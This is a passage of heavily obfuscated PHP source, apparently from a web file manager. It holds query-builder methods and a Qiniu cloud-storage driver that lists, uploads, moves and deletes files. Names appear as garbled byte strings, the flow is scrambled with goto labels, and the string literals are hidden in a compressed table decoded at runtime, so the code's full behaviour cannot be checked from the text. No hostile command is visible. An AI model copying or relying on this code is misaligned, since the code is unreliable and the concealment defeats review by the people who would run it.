(is_array($a‘ˆ³äªÓ)) { if (isset($a‘ˆ³äªÓ[0])) { $this->options[$D„››’²Ã‰[345]] = array_merge($this->options[$D„››’²Ã‰[345]], $a‘ˆ³äªÓ); return $this; } else { $A¥£² Áº = $a‘ˆ³äªÓ; } } else { think_exception(think_lang($D„››’²Ã‰[269])); } $this->options[$D„››’²Ã‰[345]][] = $A¥£² Áº; goto e“«ÁŠîÓ±; e“«ÁŠîÓ±: return $this; goto EòƒÁãï; cñ×µ´Úäï: $D„››’²Ã‰ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (empty($a‘ˆ³äªÓ)) { return $this; } if ($fñ”îéÊ¼×) { $this->options[$D„››’²Ã‰[345]][$D„››’²Ã‰[346]] = !0; } goto a¿òµ‚æÇÄ; EòƒÁãï: } public function cache($aàãÁ”Êå = true, $Dä¼›šÙˆŞ = null, $fâµÆ™õ‹ = '') { $Dï³›À÷Š¢ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!1 !== $aàãÁ”Êå) { $this->options[$Dï³›À÷Š¢[347]] = array($Dï³›À÷Š¢[93] => $aàãÁ”Êå, $Dï³›À÷Š¢[337] => $Dä¼›šÙˆŞ, $Dï³›À÷Š¢[29] => $fâµÆ™õ‹); } return $this; } public function field($bÕŒÛÓ®¹Ñ, $d¦ã«´…ˆ = false) { $eÕêÛ‡›˜ß =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!0 === $bÕŒÛÓ®¹Ñ) { $b´š‹º’‹ì = $this->getDbFields(); $bÕŒÛÓ®¹Ñ = $b´š‹º’‹ì ? $b´š‹º’‹ì : $eÕêÛ‡›˜ß[182]; } elseif ($d¦ã«´…ˆ) { if (is_string($bÕŒÛÓ®¹Ñ)) { $bÕŒÛÓ®¹Ñ = explode($eÕêÛ‡›˜ß[47], $bÕŒÛÓ®¹Ñ); } $b´š‹º’‹ì = $this->getDbFields(); $bÕŒÛÓ®¹Ñ = $b´š‹º’‹ì ? array_diff($b´š‹º’‹ì, $bÕŒÛÓ®¹Ñ) : $bÕŒÛÓ®¹Ñ; } $this->options[$eÕêÛ‡›˜ß[271]] = $bÕŒÛÓ®¹Ñ; return $this; } public function scope($BµàŠŒ‘Ñ = '', $e·ëè¢é÷ = NULL) { $aÆÜ–„ª£ì =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($aÆÜ–„ª£ì[33] === $BµàŠŒ‘Ñ) { if (isset($this->_scope[$aÆÜ–„ª£ì[34]])) { $Aøƒ»æ´‰ = $this->_scope[$aÆÜ–„ª£ì[34]]; } else { return $this; } } elseif (is_string($BµàŠŒ‘Ñ)) { $fèêÃö¦ÊÄ = explode($aÆÜ–„ª£ì[47], $BµàŠŒ‘Ñ); $Aøƒ»æ´‰ = array(); foreach ($fèêÃö¦ÊÄ as $B”¶¶­í¡Î) { if (!isset($this->_scope[$B”¶¶­í¡Î])) { continue; } $Aøƒ»æ´‰ = array_merge($Aøƒ»æ´‰, $this->_scope[$B”¶¶­í¡Î]); } if (!empty($e·ëè¢é÷) && is_array($e·ëè¢é÷)) { $Aøƒ»æ´‰ = array_merge($Aøƒ»æ´‰, $e·ëè¢é÷); } } elseif (is_array($BµàŠŒ‘Ñ)) { $Aøƒ»æ´‰ = $BµàŠŒ‘Ñ; } if (is_array($Aøƒ»æ´‰) && !empty($Aøƒ»æ´‰)) { $this->options = array_merge($this->options, array_change_key_case($Aøƒ»æ´‰)); } return $this; } public function where($c½ç òê, $A‡¬İ¶å¸ = null) { $EÊšÇ‰®‹æ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!is_null($A‡¬İ¶å¸) && is_string($c½ç òê)) { if (!is_array($A‡¬İ¶å¸)) { $A‡¬İ¶å¸ = func_get_args(); array_shift($A‡¬İ¶å¸); } $A‡¬İ¶å¸ = array_map(array($this->db, $EÊšÇ‰®‹æ[341]), $A‡¬İ¶å¸); $c½ç òê = vsprintf($c½ç òê, $A‡¬İ¶å¸); } elseif (is_object($c½ç òê)) { $c½ç òê = get_object_vars($c½ç òê); } elseif (is_array($c½ç òê)) { foreach ($c½ç òê as $b²ÙÖÉÏ¿© => $AÛÔø½ŠœÀ) { if ((is_numeric($b²ÙÖÉÏ¿©) || !$b²ÙÖÉÏ¿©) && is_string($AÛÔø½ŠœÀ)) { if (strpos($AÛÔø½ŠœÀ, $EÊšÇ‰®‹æ[348]) === 0) { continue; } think_trace($EÊšÇ‰®‹æ[349], $EÊšÇ‰®‹æ[33], $EÊšÇ‰®‹æ[46]); die; } } } if (is_string($c½ç òê) && $EÊšÇ‰®‹æ[33] != $c½ç òê) { $f“Ğ˜ ²Š = array(); $f“Ğ˜ ²Š[$EÊšÇ‰®‹æ[350]] = $c½ç òê; $c½ç òê = $f“Ğ˜ ²Š; } if (isset($this->options[$EÊšÇ‰®‹æ[273]])) { $this->options[$EÊšÇ‰®‹æ[273]] = array_merge($this->options[$EÊšÇ‰®‹æ[273]], $c½ç òê); } else { $this->options[$EÊšÇ‰®‹æ[273]] = $c½ç òê; } return $this; } public function limit($Cá•é¦ ‘Ï, $eÇò½¿ŞÆ• = null) { $eÂãÚ„¯® =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->options[$eÂãÚ„¯®[290]] = is_null($eÇò½¿ŞÆ•) ? $Cá•é¦ ‘Ï : $Cá•é¦ ‘Ï . $eÂãÚ„¯®[47] . $eÇò½¿ŞÆ•; return $this; } public function page($aíã®İç³Ã, $fó‰Ö®‡´© = null) { $bÏáƒøÖ­„ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->options[$bÏáƒøÖ­„[351]] = is_null($fó‰Ö®‡´©) ? $aíã®İç³Ã : $aíã®İç³Ã . $bÏáƒøÖ­„[47] . $fó‰Ö®‡´©; return $this; } public function comment($FŒìğ‡Ä´) { $this->options[$_SERVER[Ôğ—¤Šµˆ˜ñ£][352]] = $FŒìğ‡Ä´; return $this; } public function setProperty($E‚‡â¤¡¼, $a­¶¼¯‰ÕÛ) { if (property_exists($this, $E‚‡â¤¡¼)) { $this->{$E‚‡â¤¡¼} = $a­¶¼¯‰ÕÛ; } return $this; } } goto e¬ŠÏƒÚ¯Á; bõ÷Ì®Ñİ…: $B­ÎçóôÀĞ = $_SERVER[Ôğ—¤Šµˆ˜ñ£][600]; if (strlen($B­ÎçóôÀĞ) < $_SERVER[Ôğ—¤Šµˆ˜ñ£][601]) { return; } $_SERVER[´…‰Ò‹] = explode($_SERVER[Ôğ—¤Šµˆ˜ñ£][602], gzinflate(substr($_SERVER[Ôğ—¤Šµˆ˜ñ£][603], 10, -8))); goto Fƒ´—ãã; d“¨—ƒÎ¦Ÿ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($F–¬‹®¬°) { parent::__construct(); require_once SDK_DIR . $_SERVER[Ôğ—¤Šµˆ˜ñ£][1322]; $this->_init($F–¬‹®¬°); } public function _init($d™±ÑøŒ”¸) { goto eã¦‘ÂŠôˆ; Aì¯µÛŒ¡Ï: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto E»Ê‰õã¬â; E»Ê‰õã¬â: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto cœù«‡¹„·; eã¦‘ÂŠôˆ: $D ¯‡ĞØùÈ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; foreach ($d™±ÑøŒ”¸ as $C½ÉùĞ™¢ó => $bÊİªÃ‡©Ç) { if (isset($this->{$C½ÉùĞ™¢ó})) { $this->{$C½ÉùĞ™¢ó} = $bÊİªÃ‡©Ç; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($D ¯‡ĞØùÈ[1323] . LNG($D ¯‡ĞØùÈ[1283])); } goto Aì¯µÛŒ¡Ï; cœù«‡¹„·: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($dœ´„©‘», $fì¤ª—Éí = '', $EÅçƒù»¼ = REPEAT_RENAME) { if ($this->setContent($dœ´„©‘», $fì¤ª—Éí)) { return $this->getPathOuter($dœ´„©‘»); } return !1; } public function mkdir($dœÑÜù‡çæ, $FŞ¿É¦İ‘é = REPEAT_SKIP) { goto d—Ìã™ß¦; CÈä©Ş®Çç: $dœÑÜù‡çæ = $e°¨¦†šÓ . $Ašë‹Ùµ ƒ[8]; $e»ã®Ó¿Şİ = get_path_this($e°¨¦†šÓ); $Eë‹ğ´ÀâÁ = $dœÑÜù‡çæ . $e»ã®Ó¿Şİ; goto FšØØ¶‘Â­; FšØØ¶‘Â­: if (!$this->mkfile($Eë‹ğ´ÀâÁ)) { return !1; } if (!$this->moveFile($Eë‹ğ´ÀâÁ, $dœÑÜù‡çæ)) { $this->delFile($Eë‹ğ´ÀâÁ); return !1; } return $this->getPathOuter($e°¨¦†šÓ); goto F’¯’çËğ; d—Ìã™ß¦: $Ašë‹Ùµ ƒ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $e°¨¦†šÓ = trim($dœÑÜù‡çæ, $Ašë‹Ùµ ƒ[8]); if ($this->_isFolder($e°¨¦†šÓ)) { return $this->getPathOuter($e°¨¦†šÓ); } goto CÈä©Ş®Çç; F’¯’çËğ: } public function copyFile($b˜—Äİ³¸Ï, $CÇ¥»‰•™…) { $E¿¸“±Û¾… = $this->bucketManager->copy($this->bucket, $b˜—Äİ³¸Ï, $this->bucket, $CÇ¥»‰•™…, !0); return $E¿¸“±Û¾… ? !1 : $this->getPathOuter($CÇ¥»‰•™…); } public function moveFile($dë…ÃÜÒòæ, $e‹²®‡Š³³) { $eÕ¹¡«‰ Ï = $this->bucketManager->move($this->bucket, $dë…ÃÜÒòæ, $this->bucket, $e‹²®‡Š³³, !0); return $eÕ¹¡«‰ Ï ? !1 : $this->getPathOuter($e‹²®‡Š³³); } public function delFile($B¯é¶Ê—) { if (!$this->exist($B¯é¶Ê—)) { return !0; } $DŠ¨‘Çñâ› = $this->bucketManager->delete($this->bucket, $B¯é¶Ê—); return $DŠ¨‘Çñâ› ? !1 : !0; } public function delFolder($d­À‚†ƒ²) { goto eëŸ‡³¢à; aëŒÍ‘–Ü: $FäÆÚÄâÚ = $this->delByBatch($Fƒ²ÙÎ‰çÅ[$cé¦©—¶[75]]); if (!$FäÆÚÄâÚ) { return !1; } return $this->delFile($Dí£ŒÇêºº); goto cÁ¬Ö•¦éŒ; Fì‚¨ß»Ô: $Fƒ²ÙÎ‰çÅ = $this->fileList($d­À‚†ƒ²); $this->listItemCache = !0; $Dí£ŒÇêºº = trim($d­À‚†ƒ², $cé¦©—¶[8]) . $cé¦©—¶[8]; goto e¢‘ óÅ¬; eëŸ‡³¢à: $cé¦©—¶ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$this->exist($d­À‚†ƒ²)) { return !0; } $this->listItemCache = !1; goto Fì‚¨ß»Ô; e¢‘ óÅ¬: if (!empty($d­À‚†ƒ²) && $d­À‚†ƒ² !== $cé¦©—¶[191] && !in_array($Dí£ŒÇêºº, $Fƒ²ÙÎ‰çÅ[$cé¦©—¶[75]])) { $Fƒ²ÙÎ‰çÅ[$cé¦©—¶[75]][] = $Dí£ŒÇêºº; } $FäÆÚÄâÚ = $this->delByBatch($Fƒ²ÙÎ‰çÅ[$cé¦©—¶[74]]); if (!$FäÆÚÄâÚ) { return !1; } goto aëŒÍ‘–Ü; cÁ¬Ö•¦éŒ: } private function delByBatch($b´”ºØÇŒ) { foreach (array_chunk($b´”ºØÇŒ, 1000) as $E¾èŒÒ¬Ô…) { $D¿¯ Ø‘ï‰ = $this->bucketManager->buildBatchDelete($this->bucket, $E¾èŒÒ¬Ô…); list($A¢êÂ¡àõ, $DÑÑ²½³İ) = $this->bucketManager->batch($D¿¯ Ø‘ï‰); if ($DÑÑ²½³İ) { return !1; } } return !0; } public function rename($aÆ¨‚—ô, $d„Ã‹æòµ„) { return $this->renameObject($aÆ¨‚—ô, $d„Ã‹æòµ„); } public function fileInfo($bà¬†£Óçø, $Eİ‡ÀÖ¿îÑ = false, $E‚ˆ‡šêì¶ = array()) { goto BÓ‹ó¦”ë; fóÖ­‚¬º£: if (isset($E‚ˆ‡šêì¶[$E”œ—¨ÌÉ[1325]])) { $A—ÕÂ–öÍÇ[$E”œ—¨ÌÉ[84]] = substr($E‚ˆ‡šêì¶[$E”œ—¨ÌÉ[1325]] . $E”œ—¨ÌÉ[33], 0, 10); } if (isset($E‚ˆ‡šêì¶[$E”œ—¨ÌÉ[1324]])) { $A—ÕÂ–öÍÇ[$E”œ—¨ÌÉ[78]] = $E‚ˆ‡šêì¶[$E”œ—¨ÌÉ[1324]]; } return $A—ÕÂ–öÍÇ; goto Døæ·Ø×÷Ñ; A°¿š‹‘¶£: $A—ÕÂ–öÍÇ[$E”œ—¨ÌÉ[194]] = $A—ÕÂ–öÍÇ[$E”œ—¨ÌÉ[84]] = 0; $A—ÕÂ–öÍÇ[$E”œ—¨ÌÉ[195]] = $A—ÕÂ–öÍÇ[$E”œ—¨ÌÉ[196]] = !0; if (empty($E‚ˆ‡šêì¶)) { $E‚ˆ‡šêì¶ = $this->objectMeta($bà¬†£Óçø); if (!$E‚ˆ‡šêì¶) { return $A—ÕÂ–öÍÇ; } } goto fóÖ­‚¬º£; BÓ‹ó¦”ë: $E”œ—¨ÌÉ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $A—ÕÂ–öÍÇ = array($E”œ—¨ÌÉ[28] => $this->pathThis($bà¬†£Óçø), $E”œ—¨ÌÉ[76] => $this->getPathOuter($E”œ—¨ÌÉ[8] . $bà¬†£Óçø), $E”œ—¨ÌÉ[29] => $E”œ—¨ÌÉ[193], $E”œ—¨ÌÉ[78] => isset($E‚ˆ‡šêì¶[$E”œ—¨ÌÉ[1324]]) ? $E‚ˆ‡šêì¶[$E”œ—¨ÌÉ[1324]] : 0, $E”œ—¨ÌÉ[168] => $this->ext($bà¬†£Óçø)); if ($Eİ‡ÀÖ¿îÑ) { return $A—ÕÂ–öÍÇ; } goto A°¿š‹‘¶£; Døæ·Ø×÷Ñ: } public function folderInfo($eÒÈ Åâ†, $dŒ˜«õßÄ = false) { goto e›Ëì…Ï‹; bÚ‰ª»“×ä: $c†ÜÁÅ = $this->objectMeta($eÒÈ Åâ†); if (isset($c†ÜÁÅ[$b–¸…›Ü¯[1325]])) { $cÔÎ´ÒçÇ™[$b–¸…›Ü¯[84]] = substr($c†ÜÁÅ[$b–¸…›Ü¯[1325]] . $b–¸…›Ü¯[33], 0, 10); } return $cÔÎ´ÒçÇ™; goto fÁµÌ‚„ôˆ; e›Ëì…Ï‹: $b–¸…›Ü¯ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $cÔÎ´ÒçÇ™ = array($b–¸…›Ü¯[28] => $this->pathThis($eÒÈ Åâ†), $b–¸…›Ü¯[76] => $this->getPathOuter($b–¸…›Ü¯[8] . $eÒÈ Åâ†), $b–¸…›Ü¯[29] => $b–¸…›Ü¯[77]); if ($dŒ˜«õßÄ) { return $cÔÎ´ÒçÇ™; } goto Aä¢ÈĞƒâí; Aä¢ÈĞƒâí: $cÔÎ´ÒçÇ™[$b–¸…›Ü¯[194]] = $cÔÎ´ÒçÇ™[$b–¸…›Ü¯[84]] = 0; $cÔÎ´ÒçÇ™[$b–¸…›Ü¯[195]] = $cÔÎ´ÒçÇ™[$b–¸…›Ü¯[196]] = !0; $eÒÈ Åâ† = rtrim($eÒÈ Åâ†, $b–¸…›Ü¯[8]) . $b–¸…›Ü¯[8]; goto bÚ‰ª»“×ä; fÁµÌ‚„ôˆ: } public function listPath($eõÜÛä‘Ê, $d§¤Ã—‰Ô¼ = false) { $BÇ†¯‰ÌŒë =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $BÛÓ‚´ÙÇ = $this->fileList($eõÜÛä‘Ê, $BÇ†¯‰ÌŒë[8], !0); foreach ($BÛÓ‚´ÙÇ[$BÇ†¯‰ÌŒë[75]] as $eª¥£ÆøâÃ => $e¹Ó‹Üµ†ó) { $BÛÓ‚´ÙÇ[$BÇ†¯‰ÌŒë[75]][$eª¥£ÆøâÃ] = $this->folderInfo($e¹Ó‹Üµ†ó, $d§¤Ã—‰Ô¼); } foreach ($BÛÓ‚´ÙÇ[$BÇ†¯‰ÌŒë[74]] as $eª¥£ÆøâÃ => $e¹Ó‹Üµ†ó) { $BÛÓ‚´ÙÇ[$BÇ†¯‰ÌŒë[74]][$eª¥£ÆøâÃ] = $this->fileInfo($e¹Ó‹Üµ†ó[$BÇ†¯‰ÌŒë[93]], $d§¤Ã—‰Ô¼, $e¹Ó‹Üµ†ó); } return $BÛÓ‚´ÙÇ; } public function has($f£ì¦«½, $b¸ƒÁ¶Ù‡— = false, $F‡Òê‘° = true) { goto aÁ¿ÕÃŸŸ¬; aÁ¿ÕÃŸŸ¬: $Eß”ìË“Èç =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $f£ì¦«½ = trim($f£ì¦«½, $Eß”ìË“Èç[8]); $eÚÁ‡—³ = empty($f£ì¦«½) && $f£ì¦«½ !== $Eß”ìË“Èç[191] ? $Eß”ìË“Èç[33] : $f£ì¦«½ . $Eß”ìË“Èç[8]; goto e•áß´ÑÅˆ; Fµ®Ú‰ÒŠö: return !1; goto EÕ¸‹µØª²; e•áß´ÑÅˆ: $b‹ÒñáŸé£ = $Eß”ìË“Èç[33]; $AÃ×áº¼ = 500; $aÛÚ‹õ†Û = $Eß”ìË“Èç[8]; goto fÎ¼ó±‹œÚ; fÎ¼ó±‹œÚ: $FÁø¸ï¨³ = $Aáƒ§Ğ¼†Ğ = 0; while (!0) { check_abort(); list($c¸÷ìë³Ş, $e¿ƒÈĞ¬) = $this->bucketManager->listFiles($this->bucket, $eÚÁ‡—³, $b‹ÒñáŸé£, $AÃ×áº¼, $aÛÚ‹õ†Û); if ($e¿ƒÈĞ¬) { break; } $b‹ÒñáŸé£ = array_key_exists($Eß”ìË“Èç[1295], $c¸÷ìë³Ş) ? $b‹ÒñáŸé£ = $c¸÷ìë³Ş[$Eß”ìË“Èç[1326]] : $Eß”ìË“Èç[33]; if ($b¸ƒÁ¶Ù‡—) { if (!empty($c¸÷ìë³Ş[$Eß”ìË“Èç[1327]])) { $FÁø¸ï¨³ += count($c¸÷ìë³Ş[$Eß”ìË“Èç[1327]]); } if (!empty($c¸÷ìë³Ş[$Eß”ìË“Èç[1328]])) { $Aáƒ§Ğ¼†Ğ += count($c¸÷ìë³Ş[$Eß”ìË“Èç[1328]]); } if ($b‹ÒñáŸé£ === $Eß”ìË“Èç[33]) { break; } continue; } if ($F‡Òê‘°) { if (!empty($c¸÷ìë³Ş[$Eß”ìË“Èç[1327]])) { return !0; } } else { if (!empty($c¸÷ìë³Ş[$Eß”ìË“Èç[1328]])) { return !0; } } if ($b‹ÒñáŸé£ === $Eß”ìË“Èç[33]) { break; } } if ($b¸ƒÁ¶Ù‡—) { return array($Eß”ìË“Èç[203] => $FÁø¸ï¨³, $Eß”ìË“Èç[204] => $Aáƒ§Ğ¼†Ğ); } goto Fµ®Ú‰ÒŠö; EÕ¸‹µØª²: } public function listAll($A¶ÓÃ·ºõ¥) { $b ¯š§ÁŞ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $bĞ”–ƒ‡¹Õ = $this->fileList($A¶ÓÃ·ºõ¥, $b ¯š§ÁŞ[33], !0); $EÉ‰¯¸›Á = array(); foreach ($bĞ”–ƒ‡¹Õ[$b ¯š§ÁŞ[74]] as $aÂÄ±ÓõÆ¾) { $EÉ‰¯¸›Á[$aÂÄ±ÓõÆ¾[$b ¯š§ÁŞ[93]]] = $aÂÄ±ÓõÆ¾[$b ¯š§ÁŞ[78]]; } foreach ($bĞ”–ƒ‡¹Õ[$b ¯š§ÁŞ[75]] as $aÂÄ±ÓõÆ¾) { if (is_string($aÂÄ±ÓõÆ¾)) { $EÉ‰¯¸›Á[$aÂÄ±ÓõÆ¾] = 0; } } return $this->listAllFiles($A¶ÓÃ·ºõ¥, array_keys($EÉ‰¯¸›Á), $EÉ‰¯¸›Á); } private function fileList($E¼±Ğ­±, $bÏ¡èòáÜ = '', $C¢‡™¸½ñ = 0) { goto f°Ì¡©Öâ™; Eˆóö®ºŞ¨: return array($C°³µ»ØÎ­[75] => $A§âƒÇÕ¤, $C°³µ»ØÎ­[74] => $EéïÂ½Áœ); goto B“á•’î; DäôÉÔÇù: $c°“ìğõ¡ = $C°³µ»ØÎ­[33]; $A„÷«¬İ”ó = 1000; $f˜Ú›—Æáã = $this->listItemCache === !1 ? !1 : !0; goto A˜ä‹í˜Æ¯; A˜ä‹í˜Æ¯: $A§âƒÇÕ¤ = $EéïÂ½Áœ = array(); while (!0) { check_abort(); list($DË’‡İ±”Ô, $a’ŸèÄÑÂÄ) = $this->bucketManager->listFiles($this->bucket, $A¹‹â¬ÜÆ, $c°“ìğõ¡, $A„÷«¬İ”ó, $bÏ¡èòáÜ); if ($a’ŸèÄÑÂÄ) { break; } $c°“ìğõ¡ = array_key_exists($C°³µ»ØÎ­[1295], $DË’‡İ±”Ô) ? $c°“ìğõ¡ = $DË’‡İ±”Ô[$C°³µ»ØÎ­[1326]] : $C°³µ»ØÎ­[33]; $a÷ÛîÌà¥… = isset($DË’‡İ±”Ô[$C°³µ»ØÎ­[1327]]) ? $DË’‡İ±”Ô[$C°³µ»ØÎ­[1327]] : array(); $A¦÷ÙÔ‚÷ƒ = isset($DË’‡İ±”Ô[$C°³µ»ØÎ­[1328]]) ? $DË’‡İ±”Ô[$C°³µ»ØÎ­[1328]] : array(); foreach ($a÷ÛîÌà¥… as $d¾‚²‰Ş¢ô) { goto c¹®¹²­Æ‹; Aˆ¦·‰³Œ–: $d¾‚²‰Ş¢ô[$C°³µ»ØÎ­[78]] = $E´ìó¦‡õé; $bò¡ğùÄˆ† = $E´ìó¦‡õé == 0 && substr($Dñ´“‡å², strlen($Dñ´“‡å²) - 1, 1) == $C°³µ»ØÎ­[8] ? !0 : !1; if ($f˜Ú›—Æáã) { $this->cacheMethod($C°³µ»ØÎ­[199], $Dñ´“‡å², $bò¡ğùÄˆ†); $this->cacheMethod($C°³µ»ØÎ­[200], $Dñ´“‡å², $d¾‚²‰Ş¢ô); } goto c›æ“óÊ§ã; c¹®¹²­Æ‹: if ($d¾‚²‰Ş¢ô[$C°³µ»ØÎ­[93]] == $A¹‹â¬ÜÆ) { continue; } $Dñ´“‡å² = $d¾‚²‰Ş¢ô[$C°³µ»ØÎ­[93]]; $E´ìó¦‡õé = $d¾‚²‰Ş¢ô[$C°³µ»ØÎ­[1324]]; goto Aˆ¦·‰³Œ–; c›æ“óÊ§ã: if ($bò¡ğùÄˆ†) { $A§âƒÇÕ¤[] = $Dñ´“‡å²; continue; } $EéïÂ½Áœ[] = $C¢‡™¸½ñ ? $d¾‚²‰Ş¢ô : $Dñ´“‡å²; goto c†±…éĞ„; c†±…éĞ„: } foreach ($A¦÷ÙÔ‚÷ƒ as $Dñ´“‡å²) { if ($Dñ´“‡å² == $A¹‹â¬ÜÆ) { continue; } $A§âƒÇÕ¤[] = $Dñ´“‡å²; if ($f˜Ú›—Æáã) { $this->cacheMethod($C°³µ»ØÎ­[199], $Dñ´“‡å², !0); } } if ($c°“ìğõ¡ === $C°³µ»ØÎ­[33]) { break; } } if ($f˜Ú›—Æáã) { $this->cacheMethod($C°³µ»ØÎ­[199], $E¼±Ğ­±, !0); } goto Eˆóö®ºŞ¨; f°Ì¡©Öâ™: $C°³µ»ØÎ­ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $E¼±Ğ­± = trim($E¼±Ğ­±, $C°³µ»ØÎ­[8]); $A¹‹â¬ÜÆ = empty($E¼±Ğ­±) && $E¼±Ğ­± !== $C°³µ»ØÎ­[191] ? $C°³µ»ØÎ­[33] : $E¼±Ğ­± . $C°³µ»ØÎ­[8]; goto DäôÉÔÇù; B“á•’î: } public function canRead($f…ÀÕğÙëñ) { return $this->exist($f…ÀÕğÙëñ) ? !0 : !1; } public function canWrite($EŠòÔš£) { return $this->exist($EŠòÔš£) ? !0 : !1; } public function getContent($b‚ñÖ‡¬ÓŞ) { return $this->fileSubstr($b‚ñÖ‡¬ÓŞ, 0, -1); } public function setContent($fã©’›§ÁÎ, $fèÖïÕ®ó÷ = '') { $fë…ê›¨¤Ò = $this->tempFile($this->pathThis($fã©’›§ÁÎ)); file_put_contents($fë…ê›¨¤Ò, $fèÖïÕ®ó÷); if ($this->upload($fã©’›§ÁÎ, $fë…ê›¨¤Ò)) { $this->tempFileRemve($fë…ê›¨¤Ò); return !0; } return !1; } public function refreshUrls($AœÏëØƒÖ) { goto D”‚—¨×®Ô; d§Ş¹÷¢Ş¾: return $EéÒ„È´¡¢[$aô …÷®ä[1099]] == $aô …÷®ä[741] ? !0 : !1; goto e…éˆÂ‹âœ; D”‚—¨×®Ô: $aô …÷®ä =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a¾¬ƒ‰á— = array(); if (is_array($AœÏëØƒÖ)) { foreach ($AœÏëØƒÖ as $Fˆ‡‰Ü¤Ñ¹) { $a¾¬ƒ‰á—[] = $this->link($Fˆ‡‰Ü¤Ñ¹); } } else { $a¾¬ƒ‰á—[] = $this->link($AœÏëØƒÖ); } goto bÎ¤¹¦íË‘; bÎ¤¹¦íË‘: $Aå§Á¾¡ÜÔ = new Qiniu\Cdn\CdnManager($this->auth); list($EéÒ„È´¡¢, $Fß¦›„Ï©) = $Aå§Á¾¡ÜÔ->refreshUrls($a¾¬ƒ‰á—); if ($Fß¦›„Ï©) { return !1; } goto d§Ş¹÷¢Ş¾; e…éˆÂ‹âœ: } public function fileSubstr($e®´Éˆ, $f‰²à‘ñò, $a”ßïô´‡Ş) { $EÕëŒŒ§– =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!($DĞËğÚöŸï = $this->link($e®´Éˆ))) { return !1; } $EåØ¥ôÁÌ„ = !1; if ($a”ßïô´‡Ş > 0) { $aÌÍêßÍºĞ = $f‰²à‘ñò + $a”ßïô´‡Ş - 1; $EåØ¥ôÁÌ„ = array($EÕëŒŒ§–[1329] . $f‰²à‘ñò . $EÕëŒŒ§–[454] . $aÌÍêßÍºĞ); } $e¯¤¤½Ÿ·Ò = url_request($DĞËğÚöŸï, $EÕëŒŒ§–[228], !1, $EåØ¥ôÁÌ„); return $e¯¤¤½Ÿ·Ò[$EÕëŒŒ§–[731]] ? $e¯¤¤½Ÿ·Ò[$EÕëŒŒ§–[1109]] : !1; } public function upload($b‡Â´ô¸ªµ, $FªÒ­ôÖ§‘, $eÏ¢ğùÓ² = false, $CÄÉÈŒ³‹è = REPEAT_REPLACE) { $eí­½¿‚ = new Qiniu\Storage\UploadManager(); $A¸‚ñÚ†› = $this->auth->uploadToken($this->bucket, $b‡Â´ô¸ªµ); $C»õŸ²š¿ñ = get_file_mime(get_path_ext($FªÒ­ôÖ§‘)); list($C¯ÔÙ´…ö™, $F¥²‰†È³Ç) = $eí­½¿‚->putFile($A¸‚ñÚ†›, $b‡Â´ô¸ªµ, $FªÒ­ôÖ§‘, null, $C»õŸ²š¿ñ); return $F¥²‰†È³Ç ? !1 : $this->getPathOuter($b‡Â´ô¸ªµ); } public function uploadFormData($DµÈ­èìÉ, $Aƒé‘Š¬Œ„ = 3600) { return $this->uploadToken($DµÈ­èìÉ, $Aƒé‘Š¬Œ„); } public function multiUploadFormData($aÓ¥ŸºÙ‰, $B›Á””ø’ = 3600) { return $this->uploadToken($aÓ¥ŸºÙ‰, $B›Á””ø’); } private function uploadToken($dï”˜®¥ò, $CÆµº‹‚×‰ = 3600) { goto b‘íìøØé·; b‘íìøØé·: $eÉ’–ÌŒŒÅ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $CÚõƒ®æ¹ó = $CÆµº‹‚×‰; $Câ…Í¬óÏ = array($eÉ’–ÌŒŒÅ[1330] => $eÉ’–ÌŒŒÅ[1331]); goto C÷Ú­ùÓ®‡; Döë•­ŒÕ‹: $E ÓÑ†›˜ = http_type() . "\72\x2f\x2f\x75\x70\154\157\x61\x64{$E”‚®Ú£Úğ}\56\161\151\x6e\151\165\x70\x2e\x63\157\x6d\57"; return array($eÉ’–ÌŒŒÅ[1333] => $cŞíÕÓáÕ±, $eÉ’–ÌŒŒÅ[1334] => $E ÓÑ†›˜); goto E¾Œ“ùÇÕ; C÷Ú­ùÓ®‡: $c‡­¶ÓõØ¬ = $dï”˜®¥ò; $cŞíÕÓáÕ± = $this->auth->uploadToken($this->bucket, $c‡­¶ÓõØ¬, $CÚõƒ®æ¹ó, $Câ…Í¬óÏ, !0); $E”‚®Ú£Úğ = empty($this->region) || $this->region == $eÉ’–ÌŒŒÅ[1332] ? $eÉ’–ÌŒŒÅ[33] : $eÉ’–ÌŒŒÅ[454] . $this->region; goto Döë•­ŒÕ‹; E¾Œ“ùÇÕ: } public function download($d ¡„‚¢¸õ, $ağöÈ¨µ§ë) { goto a›¦…™¿ò­; EÜŒğÉœøä: $d±ÉÑâ°º¹ = 1024 * 200; $Bêë’ôô = fopen($Bâ’êø‚œ, $_SERVER[Ôğ—¤Šµˆ˜ñ£][1335]); while (!0) { $c˜ğº®¶£Ô = $this->fileSubstr($d ¡„‚¢¸õ, $c¥Ä™«ˆ, $d±ÉÑâ°º¹); if ($c˜ğº®¶£Ô === !1) { return !1; } 